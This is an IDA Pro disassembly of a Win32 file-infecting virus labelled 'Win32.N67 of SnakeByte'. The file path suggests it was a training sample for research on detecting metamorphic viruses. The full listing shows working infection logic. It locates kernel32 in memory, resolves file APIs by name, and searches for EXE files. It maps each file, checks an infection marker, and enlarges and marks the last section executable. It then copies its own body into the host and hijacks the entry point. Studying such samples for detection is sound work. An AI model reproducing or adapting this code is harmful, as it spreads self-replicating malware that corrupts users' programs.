

;
; 浜様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様�
; �	This file is generated by The Interactive Disassembler (IDA)	    �
; �	Copyright (c) 2003 by DataRescue sa/nv,	<ida@datarescue.com>	    �
; � Licensed to: Mark Stamp, San Jose State University,	1 user,	academic, 11/2003 �
; 藩様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様�
;
; File Name   :	C:\Documents and Settings\Fiona\My Documents\CS	298_Metamorphic	virus\HMM\TrainSet\N67.EXE
; Format      :	Portable executable for	IBM PC (PE)
; Imagebase   :	400000
; Section 1. (virtual address 00001000)
; Virtual size			: 00022000 ( 139264.)
; Section size in file		: 00022000 ( 139264.)
; Offset to raw	data for section: 00000600
; Flags	60000020: Text Executable Readable
; Alignment	: 16 bytes ?

		model flat

; 様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様�

; Segment type:	Pure code
; Segment permissions: Read/Execute
CODE		segment	para public 'CODE' use32
		assume cs:CODE
		;org 401000h
		assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing

; 栩栩栩栩栩栩栩� S U B	R O U T	I N E 栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩�


		public start
start		proc near

var_4		= dword	ptr -4

		nop
		nop
		nop

		nop
		nop
		nop

loc_422813:				; DATA XREF: sub_422E4E+130r
		call	$+5

loc_422818:				; DATA XREF: start+21821o
		mov	ebx, [esp+4+var_4]
		dec	esp
		add	esp, 5
		push	ebx
		pop	ebp
		sub	ebp, offset loc_422818
		jmp	loc_422D5C
start		endp

; 陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳�
byte_42282C	db 8Bh,	0B5h		; DATA XREF: CODE:00422DE1r
		dd offset dword_422BB3
; 陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳�
		mov	ecx, [esi+78h]
		add	ecx, ss:dword_422A53[ebp]
		dec	ecx
		add	ecx, 1Dh
		mov	esi, [ecx]
		xor	ebx, 3746CAEh
		add	ecx, 4
		add	esi, ss:dword_422A53[ebp]
		mov	ss:dword_422A1E[ebp], esi
		mov	esi, [ecx]
		add	esi, ss:dword_422A53[ebp]
		mov	ss:dword_422A41[ebp], esi
		inc	ecx
		add	ecx, 3
		mov	esi, [ecx]
		rol	eax, 0Fh
		add	esi, ss:dword_422A53[ebp]
		mov	ss:dword_422A1A[ebp], esi
		mov	ecx, 5B4Eh
		sub	ecx, 5B4Eh
		add	ecx, 8
		mov	edi, offset dword_422BCB
		add	edi, ebp
		lea	eax, dword_422C3B[ebp]

loc_422894:				; CODE XREF: CODE:004228C1j
		and	edx, 0
		mov	dl, [edi]
		sub	edi, 0FFFFFFFFh
		call	loc_4228D2
		add	edi, edx
		adc	ss:dword_422A57[ebp], 1248742h
		push	ss:dword_422A63[ebp]
		pop	esi
		mov	dword ptr [eax], 0
		add	[eax], esi
		dec	eax
		add	eax, 5
		dec	ecx
		jnz	short loc_422894
		adc	ss:dword_422A57[ebp], 1558345h
		jmp	loc_4229B1
; 陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳�

loc_4228D2:				; CODE XREF: CODE:0042289Cp
		pusha
		mov	eax, ss:dword_422A41[ebp]
		mov	ss:word_422A45[ebp], 0

loc_4228E2:				; CODE XREF: CODE:0042293Ej
		push	eax
		mov	ebx, [eax]
		add	ebx, ss:dword_422A53[ebp]
		mov	eax, 0FFFFEDF3h
		add	eax, 120Dh
		add	eax, ebx
		push	ebx
		pop	ebx
		mov	ss:dword_422A16[ebp], edx
		mov	ss:dword_422C5B[ebp], ebx
		push	edi
		cld

loc_422907:				; CODE XREF: CODE:00422918j
		mov	ch, [edi]
		cmp	ch, [ebx]
		jnz	short loc_42291A
		inc	edx
		sub	edx, 2
		cmp	edx, 0
		jz	short loc_422940
		inc	ebx
		inc	edi
		jmp	short loc_422907
; 陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳�

loc_42291A:				; CODE XREF: CODE:0042290Bj
		pop	edi
		mov	ebx, ss:dword_422C5B[ebp]
		mov	edx, ss:dword_422A16[ebp]
		pop	eax
		add	eax, 4
		add	ss:word_422A45[ebp], 1
		cmp	ss:word_422A45[ebp], 2006h
		jz	short loc_42297D
		jmp	short loc_4228E2
; 陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳�

loc_422940:				; CODE XREF: CODE:00422914j
		pop	ebx
		pop	edi
		xor	eax, eax
		mov	ax, ss:word_422A45[ebp]
		shl	eax, 1
		add	eax, ss:dword_422A1A[ebp]
		xchg	eax, ecx
		push	0
		pop	eax
		mov	ax, [ecx]
		shl	eax, 2
		add	eax, ss:dword_422A1E[ebp]
		mov	ebx, ss:dword_422A53[ebp]
		add	ebx, [eax]
		mov	ss:dword_422A63[ebp], 0
		add	ss:dword_422A63[ebp], ebx
		popa
		retn
; 陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳�

loc_42297D:				; CODE XREF: CODE:0042293Cj
		pop	eax
		popa
		jmp	short loc_422999
; 陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳�

loc_422981:				; CODE XREF: CODE:00422D80j
		push	ss:dword_422BC7[ebp]
		pop	ss:dword_42299E[ebp]
		push	ss:dword_422BBB[ebp]
		pop	ss:dword_4229A4[ebp]

loc_422999:				; CODE XREF: CODE:0042297Fj
					; CODE:00422A0Aj
		test	ebp, ebp
		jz	short loc_4229AA
; 陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳�
		db 0BBh	; �
dword_42299E	dd 0			; DATA XREF: CODE:00422987w
					; CODE:004229C3w
		db 81h,	0C3h
dword_4229A4	dd 0			; DATA XREF: CODE:00422993w
					; CODE:004229B7w
; 陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳�
		jmp	ebx
; 陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳�

loc_4229AA:				; CODE XREF: CODE:0042299Bj
		push	0
		call	ExitProcess

loc_4229B1:				; CODE XREF: CODE:004228CDj
		mov	ebx, ss:dword_422BBB[ebp]
		mov	ss:dword_4229A4[ebp], ebx
		mov	edx, ss:dword_422BC7[ebp]
		mov	ss:dword_42299E[ebp], edx
		push	14h
		pop	ecx
		mov	ss:dword_422A47[ebp], ecx
		mov	edx, offset dword_422BAD
		add	edx, ebp
		call	sub_422FB9
		add	eax, 1
		cmp	eax, 0
		jz	short loc_4229FE

loc_4229E6:				; CODE XREF: CODE:004229FCj
		call	sub_422DE9
		cmp	ss:dword_422A47[ebp], 0
		jbe	short loc_4229FE
		call	sub_422F9D
		cmp	eax, 0
		jnz	short loc_4229E6

loc_4229FE:				; CODE XREF: CODE:004229E4j
					; CODE:004229F2j
		push	ss:dword_422A39[ebp]
		call	ss:dword_422C53[ebp]
		jmp	short loc_422999
; 陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳�
		dd 833EB81h
		db 86h,	5
dword_422A12	dd 0			; DATA XREF: sub_422C5F+7r
					; sub_422E4E+25w ...
dword_422A16	dd 0			; DATA XREF: CODE:004228F9w
					; CODE:00422921r
dword_422A1A	dd 0			; DATA XREF: CODE:00422873w
					; CODE:0042294Dr
dword_422A1E	dd 0			; DATA XREF: CODE:00422850w
					; CODE:0042295Dr
aWin32_n67OfSna	db 'Win32.N67 of SnakeByte',0
dword_422A39	dd 0			; DATA XREF: CODE:004229FEr
					; sub_422F9D+Er ...
dword_422A3D	dd 0			; DATA XREF: sub_422E4E+B6w
dword_422A41	dd 0			; DATA XREF: CODE:0042285Ew
					; CODE:004228D3r
word_422A45	dw 0			; DATA XREF: CODE:004228D9w
					; CODE:0042292Bw ...
dword_422A47	dd 0			; DATA XREF: CODE:004229CCw
					; CODE:004229EBr ...
dword_422A4B	dd 0			; DATA XREF: sub_422C95+2Er
					; sub_422CCB+21r ...
dword_422A4F	dd 0			; DATA XREF: sub_422C5F+12w
					; sub_422C5F+1Cr
dword_422A53	dd 0			; DATA XREF: CODE:00422835r
					; CODE:0042284Ar ...
dword_422A57	dd 0			; DATA XREF: CODE:004228A3w
					; CODE:004228C3w ...
dword_422A5B	dd 0			; DATA XREF: CODE:00422D65w
					; CODE:00422D6Fw ...
dword_422A5F	dd 0			; DATA XREF: sub_422CCB+32w
					; sub_422CCB+4Cr ...
dword_422A63	dd 0			; DATA XREF: CODE:004228ADr
					; CODE:0042296Bw ...
dword_422A67	dd 8 dup(0)		; DATA XREF: sub_422F9D+7o
					; sub_422FB9+7o
dword_422A87	dd 0			; DATA XREF: sub_422CCBr
					; sub_422DE9+38r ...
		dd 2 dup(0)
dword_422A93	dd 0			; DATA XREF: sub_422C95+12o
					; sub_422FDE+1r
		dd 45h dup(0)
		db 2 dup(0)
dword_422BAD	dd 58452E2Ah		; DATA XREF: CODE:004229D2o
		db 65h,	0
dword_422BB3	dd 0			; DATA XREF: CODE:0042282Eo
					; CODE:00422DDBw
dword_422BB7	dd 0			; DATA XREF: sub_422C5F+1r
					; sub_422C5F+24w ...
dword_422BBB	dd 0			; DATA XREF: CODE:0042298Dr
					; CODE:004229B1r ...
dword_422BBF	dd 0			; DATA XREF: sub_422E4E+36w
					; sub_422E4E+40w
dword_422BC3	dd 0			; DATA XREF: sub_422CCB+5Dw
					; sub_422D43r ...
dword_422BC7	dd 0			; DATA XREF: CODE:00422981r
					; CODE:004229BDr ...
dword_422BCB	dd 6E69460Dh, 78654E64h, 6C694674h, 4D0D4165h, 69567061h
					; DATA XREF: CODE:00422887o
		dd 664F7765h, 656C6946h, 6D6E550Fh, 69567061h, 664F7765h
		dd 656C6946h, 6F6C430Bh, 61486573h, 656C646Eh, 6572430Bh
		dd 46657461h, 41656C69h, 6E69460Eh, 72694664h, 69467473h
		dd 941656Ch, 646E6946h,	736F6C43h, 72431265h, 65746165h
		dd 656C6946h, 7070614Dh, 41676E69h
dword_422C3B	dd 0			; DATA XREF: CODE:0042288Er
					; sub_422F9D+15r
dword_422C3F	dd 0			; DATA XREF: sub_422CCB+52r
dword_422C43	dd 0			; DATA XREF: sub_422D43+6r
dword_422C47	dd 0			; DATA XREF: sub_422D30+Br
					; sub_422D43+12r
dword_422C4B	dd 0			; DATA XREF: sub_422C95+1Cr
dword_422C4F	dd 0			; DATA XREF: sub_422FB9+Er
dword_422C53	dd 0			; DATA XREF: CODE:00422A04r
dword_422C57	dd 0			; DATA XREF: sub_422CCB+27r
dword_422C5B	dd 0			; DATA XREF: CODE:004228FFw
					; CODE:0042291Br

; 栩栩栩栩栩栩栩� S U B	R O U T	I N E 栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩�


sub_422C5F	proc near		; CODE XREF: sub_422E4E+2Bp
					; sub_422E4E+E0p
		pusha
		mov	eax, ss:dword_422BB7[ebp]
		mov	ecx, ss:dword_422A12[ebp]
		mov	edx, 0
		mov	ss:dword_422A4F[ebp], eax
		div	ecx
		sub	ecx, edx
		mov	eax, ss:dword_422A4F[ebp]
		add	eax, ecx
		mov	ss:dword_422BB7[ebp], 0
		add	ss:dword_422BB7[ebp], eax
		popa
		retn
sub_422C5F	endp


; 栩栩栩栩栩栩栩� S U B	R O U T	I N E 栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩�


sub_422C95	proc near		; CODE XREF: sub_422DE9p
		push	0
		push	0
		push	3
		push	0
		push	1
		mov	ecx, 0C0000000h
		push	ecx
		mov	ebx, ebp
		add	ebx, offset dword_422A93
		sar	eax, 0Bh
		push	ebx
		call	ss:dword_422C4B[ebp]
		add	eax, 1
		jz	loc_422D41
		sub	eax, 1
		lea	edi, dword_422A4B[ebp]
		mov	[edi], eax
sub_422C95	endp


; 栩栩栩栩栩栩栩� S U B	R O U T	I N E 栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩�


sub_422CCB	proc near		; CODE XREF: sub_422E4E+53p
		push	ss:dword_422A87[ebp]
		pop	ebx
		and	edx, eax
		push	ebx
		mov	ss:dword_422A57[ebp], eax
		mov	ecx, 0A9DEh
		sub	ecx, 0A9DEh
		push	ecx
		push	ebx
		push	ecx
		push	4
		push	ecx
		push	ss:dword_422A4B[ebp]
		call	ss:dword_422C57[ebp]
		sbb	edx, 7
		mov	edx, eax
		mov	ss:dword_422A5F[ebp], edx
		shr	ecx, 18h
		pop	ebx
		test	eax, eax
		jz	short loc_422D35
		and	eax, 0
		push	ebx
		push	eax
		push	eax
		mov	ecx, 2
		push	ecx
		push	ss:dword_422A5F[ebp]
		call	ss:dword_422C3F[ebp]
		test	eax, eax
		jz	short sub_422D30
		push	eax
		pop	ss:dword_422BC3[ebp]
		clc
		retn
sub_422CCB	endp


; 栩栩栩栩栩栩栩� S U B	R O U T	I N E 栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩�


sub_422D30	proc near		; CODE XREF: sub_422CCB+5Aj
					; sub_422DE9+5Fp
		call	sub_422D43

loc_422D35:				; CODE XREF: sub_422CCB+3Ej
		push	ss:dword_422A4B[ebp]
		call	ss:dword_422C47[ebp]

loc_422D41:				; CODE XREF: sub_422C95+25j
		stc
		retn
sub_422D30	endp


; 栩栩栩栩栩栩栩� S U B	R O U T	I N E 栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩�


sub_422D43	proc near		; CODE XREF: sub_422D30p
					; sub_422E4E+47p
		push	ss:dword_422BC3[ebp]
		call	ss:dword_422C43[ebp]
		push	ss:dword_422A5F[ebp]
		call	ss:dword_422C47[ebp]
		retn
sub_422D43	endp

; 陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳�

loc_422D5C:				; CODE XREF: start+21827j
		mov	edx, [esp]
		shr	edx, 10h
		shl	edx, 10h
		mov	ss:dword_422A5B[ebp], 0
		add	ss:dword_422A5B[ebp], 3

loc_422D76:				; CODE XREF: CODE:00422DA9j
		mov	eax, ss:dword_422A5B[ebp]
		or	eax, eax
		jnz	short loc_422D85
		jmp	loc_422981
; 陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳�

loc_422D85:				; CODE XREF: CODE:00422D7Ej
		dec	ss:dword_422A57[ebp]
		cmp	word ptr [edx],	5A4Dh
		jz	short loc_422DAB

loc_422D92:				; CODE XREF: CODE:00422DBBj
					; CODE:00422DD0j
		mov	eax, 0FFF1h
		add	eax, 0Fh
		sub	edx, eax
		mov	ecx, ss:dword_422A5B[ebp]
		dec	ecx
		mov	ss:dword_422A5B[ebp], ecx
		jmp	short loc_422D76
; 陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳�

loc_422DAB:				; CODE XREF: CODE:00422D90j
		mov	ebx, [edx+3Ch]
		xchg	ebx, edx
		add	edx, ebx
		xchg	ebx, edx
		cmp	word ptr [ebx],	4550h
		jz	short loc_422DBD
		jmp	short loc_422D92
; 陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳�

loc_422DBD:				; CODE XREF: CODE:00422DB9j
		add	ebx, 16h
		and	eax, 0
		mov	ax, [ebx]
		and	ax, 0F000h
		cmp	ax, 2000h
		jz	short loc_422DD2
		jmp	short loc_422D92
; 陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳�

loc_422DD2:				; CODE XREF: CODE:00422DCEj
		sub	ebx, 16h
		mov	ss:dword_422A53[ebp], edx
		mov	ss:dword_422BB3[ebp], ebx
		lea	ecx, byte_42282C[ebp]
		push	ecx
		retn

; 栩栩栩栩栩栩栩� S U B	R O U T	I N E 栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩�


sub_422DE9	proc near		; CODE XREF: CODE:004229E6p
		call	sub_422C95
		jb	short locret_422E4D
		and	edi, 0
		add	edi, ss:dword_422BC3[ebp]
		cmp	word ptr [edi],	5A4Dh
		jz	short loc_422E13
		mov	edx, 0
		add	edx, 0CAC5h
		cmp	edx, 0CAC5h
		jz	short loc_422E48

loc_422E13:				; CODE XREF: sub_422DE9+15j
		cmp	word ptr [edi+3Ch], 0
		jnz	short loc_422E1C
		jmp	short loc_422E48
; 陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳�

loc_422E1C:				; CODE XREF: sub_422DE9+2Fj
		xor	esi, esi
		add	esi, [edi+3Ch]
		cmp	esi, ss:dword_422A87[ebp]
		ja	short loc_422E48
		add	esi, edi
		cmp	word ptr [esi],	4550h
		jz	short loc_422E34
		jmp	short loc_422E48
; 陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳�

loc_422E34:				; CODE XREF: sub_422DE9+47j
		cmp	dword ptr [esi+4Ch], 4E3637h
		jnz	short loc_422E3F
		jmp	short loc_422E48
; 陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳�

loc_422E3F:				; CODE XREF: sub_422DE9+52j
		call	sub_422E4E
		jnb	short loc_422E48
		jmp	short locret_422E4D
; 陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳�

loc_422E48:				; CODE XREF: sub_422DE9+28j
					; sub_422DE9+31j ...
		call	sub_422D30

locret_422E4D:				; CODE XREF: sub_422DE9+5j
					; sub_422DE9+5Dj
		retn
sub_422DE9	endp


; 栩栩栩栩栩栩栩� S U B	R O U T	I N E 栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩�


sub_422E4E	proc near		; CODE XREF: sub_422DE9+56p
		mov	edx, ss:dword_422BC3[ebp]
		mov	esi, edx
		add	esi, [edx+3Ch]
		add	esi, 3Ch
		mov	eax, [esi]
		sub	esi, 3Ch
		mov	ebx, ss:dword_422A87[ebp]
		add	ebx, 7E5h
		mov	ss:dword_422BB7[ebp], ebx
		mov	ss:dword_422A12[ebp], eax
		call	sub_422C5F
		mov	ebx, ss:dword_422BB7[ebp]
		mov	ss:dword_422BBF[ebp], 0
		add	ss:dword_422BBF[ebp], ebx
		pusha
		call	sub_422D43
		popa
		mov	ss:dword_422A87[ebp], ebx
		call	sub_422CCB
		jb	loc_422F9B
		push	ss:dword_422BC3[ebp]
		pop	esi
		mov	ecx, esi
		add	ecx, [esi+3Ch]
		xor	esi, esi
		add	esi, ecx
		movzx	edx, word ptr [esi+6]
		sub	edx, 1
		imul	edx, 28h
		add	ecx, edx
		add	ecx, 78h
		mov	eax, [esi+74h]
		shl	eax, 3
		add	edx, edx
		add	ecx, eax
		mov	eax, [esi+28h]
		add	ebx, ebx
		mov	ss:dword_422BC7[ebp], eax
		mov	ebx, [esi+34h]
		mov	ss:dword_422BBB[ebp], ebx
		mov	ebx, 0
		add	ebx, [ecx+10h]
		push	ebx
		pop	eax
		add	ecx, 14h
		add	ebx, [ecx]
		sub	ecx, 14h
		push	ebx
		mov	edx, eax
		add	edx, [ecx+0Ch]
		mov	[esi+28h], edx
		mov	ss:dword_422A3D[ebp], edx
		mov	edx, 0FFFF06EDh
		add	edx, 0F913h
		add	edx, [ecx+10h]
		push	edx
		push	dword ptr [esi+3Ch]
		pop	ss:dword_422A12[ebp]
		add	edx, 7E5h
		mov	ss:dword_422BB7[ebp], edx
		call	sub_422C5F
		mov	edx, ss:dword_422BB7[ebp]
		mov	dword ptr [ecx+10h], 0
		add	[ecx+10h], edx
		pop	edx
		add	edx, 7E5h
		mov	dword ptr [ecx+8], 0
		add	[ecx+8], edx
		mov	edx, [ecx+0Ch]
		add	edx, [ecx+10h]
		mov	dword ptr [esi+50h], 0
		add	[esi+50h], edx
		or	dword ptr [ecx+24h], 0A0000020h
		mov	dword ptr [esi+4Ch], 4E3637h
		pop	edi
		add	edi, ss:dword_422BC3[ebp]
		mov	edx, 7E5h
		lea	esi, loc_422813[ebp]

loc_422F84:				; CODE XREF: sub_422E4E+138j
		movsb
		dec	edx
		jnz	short loc_422F84
		xor	eax, eax
		add	eax, ss:dword_422A47[ebp]
		add	eax, 0FFFFFFFFh
		mov	ss:dword_422A47[ebp], eax
		clc
		retn
; 陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳陳�

loc_422F9B:				; CODE XREF: sub_422E4E+58j
		stc
		retn
sub_422E4E	endp


; 栩栩栩栩栩栩栩� S U B	R O U T	I N E 栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩�


sub_422F9D	proc near		; CODE XREF: CODE:004229F4p
		call	sub_422FDE
		mov	edx, ebp
		add	edx, offset dword_422A67
		push	edx
		mov	eax, ss:dword_422A39[ebp]
		push	eax
		call	ss:dword_422C3B[ebp]
		retn
sub_422F9D	endp


; 栩栩栩栩栩栩栩� S U B	R O U T	I N E 栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩�


sub_422FB9	proc near		; CODE XREF: CODE:004229D9p
		call	sub_422FDE
		mov	eax, ebp
		add	eax, offset dword_422A67
		push	eax
		push	edx
		call	ss:dword_422C4F[ebp]
		mov	ss:dword_422A39[ebp], 0
		add	ss:dword_422A39[ebp], eax
		retn
sub_422FB9	endp


; 栩栩栩栩栩栩栩� S U B	R O U T	I N E 栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩栩�


sub_422FDE	proc near		; CODE XREF: sub_422F9Dp sub_422FB9p
		pusha
		lea	edi, dword_422A93[ebp]
		mov	eax, 119h
		xor	eax, 0Dh

loc_422FED:				; CODE XREF: sub_422FDE+16j
		mov	byte ptr [edi],	0
		add	edi, 1
		dec	eax
		jnz	short loc_422FED
		popa
		retn
sub_422FDE	endp

; [00000006 BYTES: COLLAPSED FUNCTION ExitProcess. PRESS KEYPAD	"+" TO EXPAND]
		align 4
CODE		ends

; Section 2. (virtual address 00023000)
; Virtual size			: 00001000 (   4096.)
; Section size in file		: 00000000 (	  0.)
; Offset to raw	data for section: 00022600
; Flags	C0000040: Data Readable	Writable
; Alignment	: 16 bytes ?
; 様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様�

; Segment type:	Pure data
; Segment permissions: Read/Write
DATA		segment	para public 'DATA' use32
		assume cs:DATA
		;org 423000h
		align 2000h
DATA		ends

;
; Imports from KERNEL32
;
; Section 3. (virtual address 00024000)
; Virtual size			: 00001000 (   4096.)
; Section size in file		: 00000200 (	512.)
; Offset to raw	data for section: 00022600
; Flags	C0000040: Data Readable	Writable
; Alignment	: 16 bytes ?
; 様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様様�

; Segment type:	Externs
; _idata
; void __stdcall __imp_ExitProcess(UINT	uExitCode)
		extrn __imp_ExitProcess:dword ;	DATA XREF: ExitProcessr



		end start
